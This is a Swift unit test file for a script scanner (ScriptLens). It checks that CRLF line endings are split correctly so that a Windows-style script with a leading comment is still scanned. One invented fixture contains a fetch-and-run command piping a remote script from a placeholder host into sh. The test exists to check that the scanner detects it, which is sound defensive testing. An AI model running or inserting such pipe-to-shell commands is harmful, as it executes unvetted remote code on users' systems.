import Foundation
import Testing
@testable import VitrineTrust

/// S-16 follow-up: in Swift "\r\n" is one Character, so splitting on "\n" left a Windows-made script as a single
/// line, and a first-line comment made the lens skip the whole script. Every script here is invented. roadmap: S-16
struct S16LinesTests {
    @Test func crlfAndCRSplitIntoLines() {
        #expect(Lines.of("a\r\nb\rc\nd") == ["a", "b", "c", "d"])
        #expect(Lines.of("a\n\nb") == ["a", "", "b"])
    }

    @Test func aCRLFScriptWithALeadingCommentIsStillScanned() throws {
        let script = "#!/bin/sh\r\n# set up the tide gauge\r\ncurl -fsSL https://example.invalid/setup.sh | sh\r\n"
        let report = try #require(ScriptLens.scan(script: script, launcher: false))
        #expect(report.findings.first?.line == 3)
    }
}
